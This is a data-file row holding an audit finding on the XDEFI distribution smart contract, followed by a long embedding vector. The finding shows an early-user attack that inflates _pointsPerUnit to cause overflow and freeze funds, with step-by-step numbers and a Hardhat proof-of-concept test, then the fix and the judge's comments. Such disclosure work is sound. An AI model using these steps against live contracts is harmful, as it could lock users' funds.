text,embedding
"High Severity

[H-01]

 Malicious early user/attacker can malfunction the contract and even freeze users' funds in edge cases

<https://github.com/XDeFi-tech/xdefi-distribution/blob/3856a42df295183b40c6eee89307308f196612fe/contracts/XDEFIDistribution.sol#L151-L151```solidity_pointsPerUnit += ((newXDEFI * _pointsMultiplier) / totalUnitsCached);```In the current implementation,  `_pointsPerUnit` can be changed in `updateDistribution()` which can be called by anyone.A malicious early user can `lock()` with only `1 wei` of XDEFI and makes `_pointsPerUnit` to be very large, causing future users not to be able to `lock()` and/or `unlock()` anymore due to overflow in arithmetic related to `_pointsMultiplier`.As a result, the contract can be malfunctioning and even freeze users' funds in edge cases.Given:*   bonusMultiplierOf[30 days] = 1001.  Alice `lock()` `1 wei` of XDEFI for 30 days as the first user of the contract. Got `1` units, and `totalUnits` now is `1`;2.  Alice sends `170141183460469 wei` of `XDEFI` to the contract and calls `updateDistribution()`:```solidity_pointsPerUnit += ((170141183460469 * 2128) / 1);```3.  Bob tries to `lock()` `1,100,000 * 1e18` of `XDEFI` for 30 days, the tx will fail, as `_pointsPerUnit * units` overlows;4.  Bob `lock()` `1,000,000 * 1e18` of `XDEFI` for 30 days;5.  The rewarder sends `250,000 * 1e18` of `XDEFI` to the contract and calls `updateDistribution()`:```solidity_pointsPerUnit += ((250_000 * 1e18 * 2128) / (1_000_000 * 1e18 + 1));```6.  30 days later, Bob tries to call `unlock()`, the tx will fail, as `_pointsPerUnit * units` overflows.Uniswap v2 solved a similar problem by sending the first 1000 lp tokens to the zero address.The same solution should work here, i.e., on constructor set an initial amount (like 1e8) for `totalUnits`<https://github.com/XDeFi-tech/xdefi-distribution/blob/3856a42df295183b40c6eee89307308f196612fe/contracts/XDEFIDistribution.sol#L39-L44```solidityconstructor (address XDEFI_, string memory baseURI_, uint256 zeroDurationPointBase_) ERC721(""Locked XDEFI"", ""lXDEFI"") {    require((XDEFI = XDEFI_) != address(0), ""INVALID_TOKEN"");    owner = msg.sender;    baseURI = baseURI_;    _zeroDurationPointBase = zeroDurationPointBase_;    totalUnits = 100_000_000;}```[deluca-mike (XDEFI) confirmed(https://github.com/code-423n4/2022-01-xdefi-findings/issues/156#issuecomment-1008255566): This is a great catch! I just tested it:  ```js const { expect } = require(""chai""); const { ethers } = require(""hardhat"");  const totalSupply = '240000000000000000000000000';  const toWei = (value, add = 0, sub = 0) = (BigInt(value) * 1_000_000_000_000_000_000n + BigInt(add) BigInt(sub)).toString();  describe(""XDEFIDistribution"", () = {     it(""Can overflow _pointsPerUnit"", async () = {         const god, alice, bob] = await ethers.getSigners();          const XDEFI = await (await (await ethers.getContractFactory(""XDEFI"")).deploy(""XDEFI"", ""XDEFI"", totalSupply)).deployed();         const XDEFIDistribution = await (await (await ethers.getContractFactory(""XDEFIDistribution"")).deploy(XDEFI.address, ""https://www.xdefi.io/nfts/"", 0)).deployed();          // Give each account 2,000,000 XDEFI         await (await XDEFI.transfer(alice.address, toWei(2_000_000))).wait();         await (await XDEFI.transfer(bob.address, toWei(2_000_000))).wait();          // bonusMultiplierOf[30 days] = 100         await (await XDEFIDistribution.setLockPeriods([2592000], 100])).wait();          // 1. Alice lock() 1 wei of XDEFI for 30 days as the first user of the contract. Got 1 units, and totalUnits now is 1;         await (await XDEFI.connect(alice).approve(XDEFIDistribution.address, 1)).wait();         await (await XDEFIDistribution.connect(alice).lock(1, 2592000, alice.address)).wait();         expect(await XDEFIDistribution.balanceOf(alice.address)).to.equal('1');         const nft1 = (await XDEFIDistribution.tokenOfOwnerByIndex(alice.address, 0)).toString();         expect((await XDEFIDistribution.positionOf(nft1)).units).to.equal(1);          // 2. Alice sends 170141183460469 wei of XDEFI to the contract and calls updateDistribution()         await (await XDEFI.connect(alice).transfer(XDEFIDistribution.address, 170141183460469)).wait();         await (await XDEFIDistribution.connect(alice).updateDistribution()).wait();          // 3. Bob tries to lock() 1,100,000 * 1e18 of XDEFI for 30 days, the tx will fail, as _pointsPerUnit * units overflows         await (await XDEFI.connect(bob).approve(XDEFIDistribution.address, toWei(1_100_000))).wait();         await expect(XDEFIDistribution.connect(bob).lock(toWei(1_100_000), 2592000, bob.address)).to.be.revertedWith(""_toInt256Safe failed"");          // 4. Bob lock() 1,000,000 * 1e18 of XDEFI for 30 days         await (await XDEFI.connect(bob).approve(XDEFIDistribution.address, toWei(1_000_000))).wait();         await (await XDEFIDistribution.connect(bob).lock(toWei(1_000_000), 2592000, bob.address)).wait();         expect(await XDEFIDistribution.balanceOf(bob.address)).to.equal('1');         const nft2 = (await XDEFIDistribution.tokenOfOwnerByIndex(bob.address, 0)).toString();         expect((await XDEFIDistribution.positionOf(nft2)).units).to.equal(toWei(1_000_000));          // 5. The rewarder sends 250,000 * 1e18 of XDEFI to the contract and calls updateDistribution()         await (await XDEFI.transfer(XDEFIDistribution.address, toWei(250_000))).wait();         await (await XDEFIDistribution.updateDistribution()).wait();          // 6. 30 days later, Bob tries to call unlock(), the tx will fail, as _pointsPerUnit * units overflows.         await hre.ethers.provider.send('evm_increaseTime', 2592000]);         await expect(XDEFIDistribution.connect(bob).unlock(nft2, bob.address)).to.be.revertedWith(""_toInt256Safe failed"");     }); }); ```  While I do like the suggestion to to `totalUnits = 100_000_000;` in the constructor, it will result ""uneven"" numbers due to the `totalUnits` offset. I wonder if I can resolve this but just reducing `_pointsMultiplier` to `uint256(296)` as per https://github.com/ethereum/EIPs/issues/1726#issuecomment-472352728.[deluca-mike (XDEFI) commented(https://github.com/code-423n4/2022-01-xdefi-findings/issues/156#issuecomment-1008266150): OK, I think I can solve this with `_pointsMultiplier = uint256(272)`:  ```js const { expect } = require(""chai""); const { ethers } = require(""hardhat"");  const totalSupply = '240000000000000000000000000';  const toWei = (value, add = 0, sub = 0) = (BigInt(value) * 1_000_000_000_000_000_000n + BigInt(add) BigInt(sub)).toString();  describe(""XDEFIDistribution"", () = {     it(""Can overflow _pointsPerUnit"", async () = {         const god, alice, bob] = await ethers.getSigners();          const XDEFI = await (await (await ethers.getContractFactory(""XDEFI"")).deploy(""XDEFI"", ""XDEFI"", totalSupply)).deployed();         const XDEFIDistribution = await (await (await ethers.getContractFactory(""XDEFIDistribution"")).deploy(XDEFI.address, ""https://www.xdefi.io/nfts/"", 0)).deployed();          // Give each account 100M XDEFI         await (await XDEFI.transfer(alice.address, toWei(100_000_000))).wait();         await (await XDEFI.transfer(bob.address, toWei(100_000_000))).wait();          // bonusMultiplierOf[30 days] = 255         await (await XDEFIDistribution.setLockPeriods([2592000], 255])).wait();          // 1. Alice lock() 1 wei of XDEFI for 30 days as the first user of the contract. Got 1 units, and totalUnits now is 1         await (await XDEFI.connect(alice).approve(XDEFIDistribution.address, 1)).wait();         await (await XDEFIDistribution.connect(alice).lock(1, 2592000, alice.address)).wait();         expect(await XDEFIDistribution.balanceOf(alice.address)).to.equal('1');         const nft1 = (await XDEFIDistribution.tokenOfOwnerByIndex(alice.address, 0)).toString();         expect((await XDEFIDistribution.positionOf(nft1)).units).to.equal(2);          // 2. Alice sends 100M XDEFI minus 1 wei to the contract and calls updateDistribution()         await (await XDEFI.connect(alice).transfer(XDEFIDistribution.address, toWei(100_000_000, 0, 1))).wait();         await (await XDEFIDistribution.connect(alice).updateDistribution()).wait();          // 3. Bob can lock() 100M XDEFI for 30 days         await (await XDEFI.connect(bob).approve(XDEFIDistribution.address, toWei(100_000_000))).wait();         await (await XDEFIDistribution.connect(bob).lock(toWei(100_000_000), 2592000, bob.address)).wait();         expect(await XDEFIDistribution.balanceOf(bob.address)).to.equal('1');         const nft2 = (await XDEFIDistribution.tokenOfOwnerByIndex(bob.address, 0)).toString();         expect((await XDEFIDistribution.positionOf(nft2)).units).to.equal(toWei(255_000_000));          // 4. The rewarder sends 40M XDEFI to the contract and calls updateDistribution()         await (await XDEFI.transfer(XDEFIDistribution.address, toWei(40_000_000))).wait();         await (await XDEFIDistribution.updateDistribution()).wait();          // 5. 30 days later, Bob can call unlock()         await hre.ethers.provider.send('evm_increaseTime', 2592000]);         await (await XDEFIDistribution.connect(bob).unlock(nft2, bob.address)).wait();     }); }); ```[deluca-mike (XDEFI) commented(https://github.com/code-423n4/2022-01-xdefi-findings/issues/156#issuecomment-1012773001): In the release candidate contract(https://github.com/XDeFi-tech/xdefi-distribution/blob/v1.0.0-rc.0/contracts/XDEFIDistribution.sol), in order to preserve the math (formulas), at the cost of some accuracy, we went with a `_pointsMultiplier` of 72 bits(https://github.com/XDeFi-tech/xdefi-distribution/blob/v1.0.0-rc.0/contracts/XDEFIDistribution.sol#L23).  Also, a minimum units locked(https://github.com/XDeFi-tech/xdefi-distribution/blob/v1.0.0-rc.0/contracts/XDEFIDistribution.sol#L53) is enforced, to prevent ""dust"" from creating a very very high `_pointsPerUnit`.  Tests were written in order to stress test the contract against the above extreme cases.  Further, a ""no-going-back"" emergency mode setter(https://github.com/XDeFi-tech/xdefi-distribution/blob/v1.0.0-rc.0/contracts/XDEFIDistribution.sol#L100) was implemented that allows (but does not force) users to withdraw only their deposits(https://github.com/XDeFi-tech/xdefi-distribution/blob/v1.0.0-rc.0/contracts/XDEFIDistribution.sol#L147) without any of the funds distribution math from being expected, in the event that some an edge case does arise.[Ivshti (Judge) commented(https://github.com/code-423n4/2022-01-xdefi-findings/issues/156#issuecomment-1013782548): fantastic finding, agreed with the proposed severity!  The sponsor fixes seem adequate: a lower `_poinsMultiplier`, a minimum lock and an emergency mode that disables reward math, somewhat similar to emergency withdraw functions in contracts like masterchef.","[0.016634998843073845, 0.0008009246084839106, -0.02088283933699131, -0.041594624519348145, -0.03421079367399216, 0.03820205479860306, -0.04464508593082428, 0.01461085956543684, -0.02839495986700058, -0.02397606521844864, 0.03620642423629761, 0.02327759377658367, 0.0017158851260319352, 0.0018637755420058966, 0.0004499075876083225, 0.020198622718453407, 0.028836848214268684, 0.0016945033567026258, 0.025444278493523598, 0.004205076955258846, 0.015095513314008713, 0.010170583613216877, -0.026028713211417198, 0.006735249888151884, -0.006464414764195681, -0.00319657102227211, 0.03329850733280182, -0.01987076923251152, 0.00425496743991971, 0.001633030828088522, 0.034723956137895584, -0.004522239323705435, -0.03660554811358452, -0.0034460248425602913, -0.0092440415173769, -0.014853186905384064, 0.014853186905384064, -0.024788571521639824, -0.01566569320857525, -0.029421282932162285, 0.03498053550720215, 0.031787529587745667, 0.007847100496292114, 0.004565002862364054, 0.014204606413841248, 0.026655910536646843, 0.016549471765756607, 0.0005385527620092034, -0.010697999969124794, 0.02336312085390091, 0.01729070581495762, 0.026541873812675476, -0.0035333335399627686, 0.014254497364163399, -0.01888720877468586, -0.015366348437964916, 0.03652002289891243, -0.009258296340703964, -0.005865725688636303, -0.0004100395308341831, -0.005961943417787552, -0.007066667079925537, -0.014347151853144169, 0.004005513619631529, -0.001207177760079503, -0.000588443479500711, -0.008488553576171398, 0.012843302451074123, -0.02716907300055027, -0.019029755145311356, 0.03158796578645706, 0.008103681728243828, 0.006236342713236809, -0.014838932082057, 0.008253353647887707, 0.010313129052519798, -0.0009122878545895219, 0.005231400486081839, 0.01401217095553875, -0.004383258055895567, 0.03355508670210838, 0.02413286454975605, -0.013976534828543663, 0.026598893105983734, -0.0023911918979138136, -0.01307850144803524, -0.011517633683979511, 0.012829047627747059, -0.004112422466278076, -0.008032409474253654, 0.01519529428333044, 0.005502236075699329, 0.025458533316850662, 0.0031181713566184044, -0.016107581555843353, -0.010184838436543941, -0.028722813352942467, 0.020526476204395294, -0.009856984950602055, -0.015152530744671822, -0.012722139246761799, 0.010776400566101074, -0.04056829959154129, -0.022465087473392487, -0.013955153524875641, -0.00456856656819582, -0.0026905364356935024, 0.009315313771367073, -0.01332082785665989, -0.008032409474253654, -0.010733637027442455, 0.02232254296541214, -0.0131854098290205, 0.004440275952219963, 0.025030897930264473, 0.007740192115306854, 0.037061695009469986, 0.0026887545827776194, -0.01845957525074482, -0.021110910922288895, 0.036691077053546906, 0.02093985676765442, -0.010790654458105564, 0.007982518523931503, 0.012551085092127323, -0.02075454778969288, -0.013762717135250568, -0.00841728039085865, -0.022393815219402313, -0.017347723245620728, 0.03854416310787201, 0.01760430447757244, 0.0353226438164711, 0.0014058498200029135, -0.004825147334486246, 0.00904447864741087, -0.02533024176955223, -0.018559355288743973, -0.015708455815911293, -0.031046295538544655, 0.01981375180184841, 0.033098943531513214, 0.005548563320189714, 0.018260011449456215, -0.004525803029537201, 0.02858026698231697, -0.01597929187119007, -0.006254160776734352, 0.014881695620715618, -0.014895949512720108, -0.023135049268603325, -0.0029488992877304554, 0.0020918475929647684, 0.012130577117204666, -0.010911817662417889, 0.017618559300899506, -0.012707884423434734, 0.005573508329689503, -0.013484754599630833, -0.023434393107891083, -0.007847100496292114, -0.0011688688537105918, -0.024204136803746223, -0.024646027013659477, 0.027867542579770088, 0.04025470092892647, -0.0013773408718407154, 0.007412338629364967, 0.009115750901401043, 0.0017292487900704145, 0.004614893812686205, 0.008231972344219685, -0.012722139246761799, 0.024460718035697937, 0.005808707792311907, 0.03612089529633522, 0.0034656247589737177, -0.019428880885243416, -0.007925501093268394, -0.002066902117803693, 0.005299109499901533, 0.0047895112074911594, 0.02959233708679676, 0.030647169798612595, -0.027767760679125786, 0.013833990320563316, 0.029449792578816414, 0.0035725333727896214, 0.01962844282388687, 0.005584199447184801, 0.015722710639238358, 0.01729070581495762, -0.031359896063804626, 0.00611874321475625, -0.5934432148933411, -0.012992974370718002, -0.018559355288743973, 0.006524996366351843, -0.005309800151735544, -0.0007229702896438539, 0.006353942211717367, 0.02407584711909294, -0.015409111976623535, 0.03939943015575409, 0.0011840142542496324, -0.000706488557625562, 0.003738241968676448, -0.03475246578454971, -0.006161506753414869, -0.020925601944327354, 0.0011367961997166276, -0.011018726974725723, -0.005926307290792465, 0.01016345713287592, 0.005716053303331137, 0.025030897930264473, -0.03215814754366875, 0.03001997247338295, 0.008830660954117775, -0.006542814429849386, 0.010968836024403572, 0.002485628006979823, -0.02581489458680153, -0.00022484242799691856, -0.030134007334709167, 0.02312079444527626, 0.01710539683699608, -0.006795831490308046, 0.05080302804708481, -0.02048371359705925, -0.007412338629364967, 0.02232254296541214, 0.011617415584623814, 0.03537966310977936, -0.03523711860179901, 0.003916423302143812, 0.037973981350660324, -0.017561541870236397, 0.015067003667354584, -0.011809851042926311, 0.011724323965609074, -0.006400269456207752, 0.007626156322658062, -0.030276553705334663, 0.012194722890853882, 0.005555690266191959, 0.005897798575460911, 0.039998121559619904, -0.011132762767374516, -0.0027760635130107403, 0.012201850302517414, -0.008467171341180801, -0.0065143052488565445, -0.023505667224526405, 0.0010396874276921153, 0.014881695620715618, -0.039912592619657516, 0.000438771239714697, -0.030362078920006752, -0.006532123312354088, 0.007989645935595036, -0.0028740630950778723, 0.01569420099258423, -0.011125635355710983, 0.010085057467222214, 0.00860258936882019, -0.01178846973925829, 0.010477055795490742, 0.017319215461611748, 0.0036776603665202856, 0.0116530517116189, -0.01032025646418333, 0.01689158007502556, 0.044787630438804626, -0.008117936551570892, -0.0274399071931839, -0.01096170861274004, 0.00195464794524014, 0.026499111205339432, 0.023534175008535385, 0.014368533156812191, -0.005894234869629145, -0.0058906711637973785, 0.007590519730001688, 0.0007318793796002865, 0.007733064703643322, 0.016877325251698494, -0.012843302451074123, 0.01989927887916565, 0.016492454335093498, 0.0022931923158466816, 0.01563718356192112, -0.0017862666863948107, -0.023006759583950043, -0.02799583412706852, 0.012180468067526817, -0.010997344739735126, -0.005049655679613352, 0.04105295240879059, 0.03247174620628357, -0.013670063577592373, -0.006535687018185854, 0.057046499103307724, -0.022579124197363853, -0.012622357346117496, -0.00460063898935914, -0.039142850786447525, -0.005388200283050537, 0.0029079176019877195, -0.0308467335999012, 0.017917903140187263, 0.0021078838035464287, -0.018317028880119324, -0.0035190791822969913, 0.02962084673345089, 0.007839974015951157, 0.019343353807926178, 0.006785140838474035, 0.008117936551570892, 0.003438897430896759, 0.019186554476618767, -0.0122374864295125, -0.008545571006834507, -0.002054429380223155, 0.016663508489727974, -0.0009229787392541766, 0.027639470994472504, -0.027468416839838028, 0.012472685426473618, 0.009286805056035519, -0.002856245031580329, 0.0067993951961398125, 0.016577981412410736, -0.018331283703446388, -0.005776635371148586, -0.011931014247238636, 0.013178283348679543, -0.038800742477178574, -0.015166785567998886, -0.019086772575974464, 0.017803868278861046, -0.003164498368278146, 0.014589478261768818, 0.007383829914033413, -0.008859170600771904, 0.0023341740015894175, -0.019158044829964638, 0.011261053383350372, -0.020811567083001137, -0.012408540584146976, 0.029734881594777107, -0.029848918318748474, 0.0073196846060454845, -0.02115367352962494, 0.0076119014993309975, 0.019086772575974464, -0.020212877541780472, -0.02333461306989193, -0.014867440797388554, -0.011232543736696243, 0.006111615803092718, 0.005815835203975439, 0.0025319550186395645, -0.017704086378216743, -0.022279780358076096, -0.005288418382406235, -0.00910862348973751, 0.009607531130313873, -0.019086772575974464, 0.039912592619657516, -0.0201416052877903, 0.008559825830161572, -0.020526476204395294, 0.008866297081112862, 0.008032409474253654, 0.014824677258729935, -0.04045426473021507, 0.004397512413561344, 0.020227132365107536, 0.004101731814444065, 0.007547756657004356, 0.037916962057352066, 0.012308758683502674, -0.0002777399786282331, -0.030305061489343643, -0.003381879534572363, -0.008994587697088718, 0.008930442854762077, -0.0122374864295125, -0.0010762145975604653, 0.014838932082057, -0.0213104747235775, 0.014168970286846161, 0.025444278493523598, 0.031873054802417755, -0.007013212889432907, 0.014097698032855988, -0.04108146205544472, 0.010847672820091248, -0.03321297839283943, 0.0019065390806645155, -0.03321297839283943, 0.019614188000559807, -0.004743183963000774, -0.023747993633151054, -0.014496823772788048, -0.0041730040684342384, -0.004679038655012846, -0.0025373005773872137, 0.02591467648744583, -0.0028312995564192533, -0.0038736597634851933, 0.019728224724531174, -0.00033832158078439534, -0.02245083451271057, -0.018374048173427582, 0.027881797403097153, 0.01205217745155096, 0.017704086378216743, -0.003930677659809589, 0.012943083420395851, -0.020811567083001137, 0.015965037047863007, 0.0023199194110929966, 0.011617415584623814, 0.001728357863612473, 0.027368634939193726, -0.02312079444527626, 0.006296924315392971, 0.008745133876800537, 0.028865357860922813, 0.011082871817052364, 0.004311985336244106, -0.020426694303750992, -0.003827332518994808, -0.006785140838474035, 0.018231501802802086, -0.017547287046909332, 0.01007080264389515, 0.005548563320189714, 0.02925022877752781, 0.01582249253988266, -0.01563718356192112, 0.03167349472641945, -0.0042727855034172535, 0.013933771289885044, -0.007148630451411009, 0.009571895003318787, 0.015067003667354584, -0.011902505531907082, 0.022493597120046616, 0.017675576731562614, 0.03418228402733803, 0.037603363394737244, -0.0019813752733170986, -0.019428880885243416, 0.028893867507576942, -0.005409582052379847, 0.030561642721295357, -0.010776400566101074, -0.031844548881053925, -0.010199093259871006, -0.007383829914033413, 0.009236914105713367, -0.011474870145320892, 0.0038308962248265743, -0.014518206007778645, 0.024432208389043808, 0.022194253280758858, 0.005495108664035797, 0.019514407962560654, 0.016121836379170418, 0.014425551518797874, -0.014546714723110199, -0.05028986558318138, -0.028494739904999733, 0.011018726974725723, 0.02002756856381893, 0.004393948707729578, -0.016421182081103325, -0.01864488236606121, 0.0006035888800397515, 0.009821348823606968, 0.007782955653965473, -0.00849568098783493, -0.0155944200232625, 0.003585006110370159, -0.012180468067526817, -0.012693630531430244, 0.0010548328282311559, 0.022365307435393333, -0.028865357860922813, -0.016235873103141785, 0.01205217745155096, 0.014952967874705791, -0.0061294338665902615, -0.024047337472438812, -0.011339453049004078, 0.03557922691106796, 0.0008187427301891148, -0.01818873919546604, -0.012615229934453964, -0.0013630862813442945, -0.017946412786841393, 0.018388301134109497, -0.013335082679986954, -0.04629860818386078, 0.01664925366640091, -0.001471776864491403, 0.0042193313129246235, 0.008046664297580719, -0.014938713051378727, 0.039313904941082, 0.014753405004739761, -0.020597748458385468, -0.0160078015178442, -0.024817081168293953, -0.0003891032247338444, 0.04339069128036499, 0.04341920092701912, 0.015223802998661995, 0.009978148154914379, -0.028893867507576942, 0.01656372658908367, 0.0010004875948652625, -0.015124022029340267, 0.008239099755883217, -0.005213582422584295, 0.011567524634301662, -0.019086772575974464, -0.004230021964758635, 0.008816407062113285, 0.011367961764335632, -0.00017016306810546666, 0.013748463243246078, -0.015252312645316124, 0.01558016613125801, 0.0009577240562066436, 0.011467743664979935, -0.006403833162039518, 0.019585680216550827, 0.022650396451354027, -0.004069658927619457, 0.0025159188080579042, 0.01249406673014164, 0.014147588983178139, -0.022735923528671265, 0.010405783541500568, -0.037546347826719284, -0.016292890533804893, 0.020184367895126343, 0.015523147769272327, -0.025216206908226013, 0.035037554800510406, 0.0012160867918282747, -0.007440847810357809, 0.014475442469120026, -0.009329568594694138, 0.026684420183300972, -0.0008846697746776044, 0.00913713313639164, 0.005466599948704243, 0.018602119758725166, -0.0048358384519815445, -0.02560107782483101, 0.01901550032198429, 0.00659270491451025, 0.017889395356178284, 0.018929973244667053, -0.012715011835098267, -0.0381450355052948, -0.030932258814573288, 0.007661792449653149, 0.001476231380365789, 0.010769273154437542, -0.008973206393420696, -0.011489124968647957, -0.03041909821331501, -0.04011215642094612, -0.04664071649312973, -0.009514877572655678, 0.010263238102197647, -0.003025517100468278, -0.015323584899306297, -0.03395421430468559, -0.014133334159851074, -0.01399791706353426, -0.003952059429138899, -0.033412542194128036, 0.010284620337188244, -0.028865357860922813, -0.00015824718866497278, 0.013349336571991444, 0.0015537402359768748, 0.012380030937492847, -0.025059407576918602, 0.012009413912892342, 0.013000101782381535, -0.01944313384592533, -0.015751220285892487, -0.004750311374664307, -0.02296399511396885, 0.012907447293400764, 0.009015969932079315, 0.0207260400056839, -0.015052749775350094, -0.011040108278393745, 0.02609998546540737, 0.0044082035310566425, 0.0014539588009938598, 0.03332701697945595, -0.025501295924186707, 0.003670533187687397, -0.017547287046909332, 0.013983662240207195, 0.02655612863600254, 0.013049992732703686, -0.02005607821047306, 0.007287611719220877, -0.008581207133829594, -0.02520195208489895, -0.004589948337525129, -0.006642595864832401, -0.0035440244246274233, 0.0027796269860118628, -0.009785712696611881, -0.009593277238309383, -0.006524996366351843, -0.028737066313624382, -0.001740830484777689, -0.010526946745812893, -0.009080114774405956, -0.0022201379761099815, -0.000541670888196677, 0.008524189703166485, -0.004875038284808397, -0.015095513314008713, -0.007355320733040571, 0.0020936294458806515, -0.006635468453168869, 0.019300589337944984, 0.006386015098541975, 0.010042293928563595, 0.0065499418415129185, -0.001897629932500422, -0.00846004392951727, -0.03498053550720215, -0.017433250322937965, -0.02394755557179451, 0.013256683014333248, -0.006606959737837315, -0.014895949512720108, -0.015181039460003376, -0.014895949512720108, -0.014382787980139256, -0.016478199511766434, -0.0022041017655283213, -0.01361304521560669, -0.02091134712100029, -0.0016882671043276787, -0.02054073102772236, -0.034666936844587326, 0.03041909821331501, -0.030704187229275703, -0.018758919090032578, 0.001142141642048955, 0.0014040679670870304, 0.00648579653352499, -0.011032980866730213, -0.020255640149116516, -0.018345538526773453, -0.010099311359226704, -0.0045578754507005215, 0.003601042553782463, 0.006296924315392971, -0.003210825612768531, 0.030533133074641228, 0.04752449318766594, 0.048493802547454834, 0.00274042715318501, 0.02514493279159069, 0.023249085992574692, 5.868843800271861e-05, 0.025287479162216187, 0.00390929589048028, -0.017304960638284683, -0.0388292521238327, 0.03278534486889839, 0.01971396990120411, 0.03518009930849075, 0.029934445396065712, -0.05773071572184563, 0.014838932082057, 0.030704187229275703, -0.02125345543026924, -0.01277203019708395, -0.026456346735358238, -0.05596315860748291, -0.008880551904439926, -0.03044760599732399, 0.019158044829964638, 0.001276668393984437, -0.051373209804296494, -0.012087813578546047, 0.015736965462565422, -0.006314742378890514, 0.006813650019466877, 0.010263238102197647, 0.028280923143029213, -0.011738578788936138, 0.013527518138289452, 0.011524761095643044, 0.049349069595336914, 0.00964316725730896, -0.012622357346117496, 0.0010102875530719757, -0.013406354933977127, 0.03244323655962944, -0.03292788937687874, 0.027097800746560097, -0.01840255595743656, 0.003738241968676448, -0.004899983759969473, -0.000910060596652329, -0.02357693947851658, -0.02836645022034645, 0.012693630531430244, -0.04227884113788605, -0.007241284940391779, -0.005851471330970526, 0.00759764714166522, -0.027796270325779915, 0.04461657628417015, 0.010077930055558681, 0.008517062291502953, 0.01352039072662592, -0.003919987007975578, -0.008410153910517693, -0.025073660537600517, 0.011909632943570614, 0.006165069993585348, 0.0060332161374390125, 0.02434668131172657, 0.03557922691106796, 0.029848918318748474, -0.03446737676858902, 0.005295545794069767, 0.021239200606942177, 0.013990789651870728, 0.04336218163371086, -0.0005848798318766057, -0.03039058856666088, -0.015024240128695965, 0.01806044764816761, -0.006671105045825243, -0.03116033226251602, -0.018844446167349815, 0.010569710284471512, 0.016022054478526115, 0.015565911307930946, -0.005641217343509197, -0.002514136955142021, -0.006763759069144726, -0.014967222698032856, -0.03489501029253006, 0.005398890934884548, 0.019913533702492714, -0.0025729367043823004, -0.01677754335105419, 0.024489227682352066, -0.006361069623380899, 0.011332325637340546, 0.0061294338665902615, -0.008659607730805874, -0.01845957525074482, -0.010498437099158764, -0.01386249903589487, 0.02125345543026924, 0.0026210458017885685, 0.01781812123954296, -0.026057220995426178, 0.00663190521299839, 0.02029840461909771, -0.0028615903574973345, 0.010370147414505482, 0.0018530846573412418, -0.016948597505688667, 0.03326999768614769, -0.02210872620344162, -0.00120539590716362, 0.017461759969592094, -0.03372614085674286, -3.903282413375564e-05, -0.016207363456487656, -0.020398186519742012, -0.030647169798612595, -0.006763759069144726, 0.007483611349016428, 0.011980905197560787, 0.003586787963286042, -0.00855269841849804, -0.00035636243410408497, -0.014511078596115112, 0.007155757863074541, -0.02906491979956627, -0.02756819874048233, 0.019001245498657227, -0.023348867893218994, -0.0026584637816995382, -0.012622357346117496, -0.019200807437300682, 0.012743520550429821, 0.00619357917457819, -0.008132190443575382, 0.002070465823635459, 0.035151589661836624, -0.014739150181412697, 0.008481426164507866, -0.03518009930849075, 0.010206220671534538, -0.04946310818195343, -0.0034228612203150988, -0.02410435490310192, -0.009678804315626621, 0.035493697971105576, -0.006072415970265865, -0.019999060779809952, -0.01007080264389515, -0.007237721234560013, 0.008075173012912273, 0.011888250708580017, 0.012743520550429821, 0.012871811166405678, -0.003241116413846612, 0.007127248682081699, -0.02287846803665161, -0.012886065989732742, 0.04635562747716904, -0.022251270711421967, 0.01062672771513462, 0.014375660568475723, -0.01346337329596281, -0.004155186004936695, -0.0037774418015033007, 0.0006561523186974227, -0.008025282062590122, -0.009992402978241444, -0.013833990320563316, -0.0017559758853167295, -0.01659223437309265, -0.0009149605757556856, -0.02312079444527626, -0.016820307821035385, -0.014154716394841671, -0.0008490335312671959, 0.0348379909992218, 0.023862028494477272, -0.016877325251698494, 0.031787529587745667, 0.0025729367043823004, -0.0009167423704639077, 0.006136561278253794, 0.008438662625849247, -0.0449586845934391, 0.02032691426575184, -0.0014931586338207126, -0.03398272395133972, -0.004689729772508144, -0.028993647545576096, 0.054936833679676056, 0.02480282634496689, -0.021723853424191475, -0.004443839658051729, -0.012265995144844055, -0.015480384230613708, -0.01499573141336441, -0.03691915050148964, 0.006232779007405043, 0.028067106381058693, 0.007626156322658062, 0.004301294684410095, 0.036719586700201035, 0.01912953518331051, 0.025258969515562057, -0.03138840198516846, 0.012707884423434734, -0.005103110335767269, -0.029307246208190918, 0.03041909821331501, -0.0077473195269703865, -0.03047611564397812, -0.004867910873144865, 0.013114137575030327, 0.05325480177998543, 0.012429921887814999, 0.02029840461909771, 0.0013443772913888097, -0.024517735466361046, -0.011403597891330719, 0.012522576376795769, -0.011474870145320892, -0.01105436310172081, 0.0026798455510288477, -0.05850045755505562, -0.0033961341250687838, 0.012529703788459301, -0.012950210832059383, -0.008659607730805874, 0.012429921887814999, 0.028138378635048866, -0.022222761064767838, -0.01096170861274004, -0.016877325251698494, 0.013499009422957897, -0.017133906483650208, -0.02066902071237564, 0.012230359017848969, 0.0004066986439283937, 0.0025034460704773664, 0.008117936551570892, 0.026670165359973907, 0.005830089561641216, -0.04088189825415611, 0.01891571842133999, -0.012736393138766289, -0.023719483986496925, 0.03321297839283943, -0.006068852264434099, 0.0005470163305290043, -0.007426593452692032, 0.026855474337935448, 0.006970449350774288, -0.007733064703643322, -0.018374048173427582, -0.0038736597634851933, -0.06642595678567886, 0.036691077053546906, 0.012045050039887428, -0.029050666838884354, -0.01750452257692814, -0.0077116833999753, 0.0022611196618527174, -0.024246901273727417, -0.013327955268323421, -0.018359793350100517, 0.006304051727056503, 0.009500622749328613, -0.011474870145320892, -0.0116530517116189, -0.039484959095716476, -0.02357693947851658, 0.0002841990499291569, 0.010127820074558258, 0.0009648512932471931, 0.1950015276670456, 0.019913533702492714, 0.0034068250097334385, 0.054167091846466064, -0.005010455846786499, 0.019357608631253242, -0.00255690049380064, -0.01134658046066761, -0.004126676823943853, 0.02879408560693264, 0.020840074867010117, 0.012700757011771202, -0.01085480023175478, -0.0036063878796994686, 0.012109195813536644, 0.017675576731562614, -0.01901550032198429, -0.014682132750749588, 0.003723987378180027, -0.0034460248425602913, 0.03324148803949356, 0.012265995144844055, -0.009757203981280327, -0.0016267945757135749, 0.025843404233455658, -0.028879612684249878, -0.011567524634301662, 0.013883880339562893, 0.010633855126798153, 0.020554985851049423, -0.024845588952302933, -0.009778585284948349, 0.008638225495815277, 0.016136091202497482, -0.0202413871884346, -0.01962844282388687, 0.018787426874041557, -0.009386586956679821, 0.022607633844017982, 0.0008886788273230195, 0.029079174622893333, 0.008837788365781307, 3.4466927900211886e-05, -0.01056258287280798, -0.018345538526773453, 0.00611874321475625, -0.0029186084866523743, -0.022835705429315567, -0.007676046807318926, 0.02413286454975605, -0.039114341139793396, -0.0020152295473963022, 0.003991259261965752, 0.006332560442388058, -0.0027618089225143194, 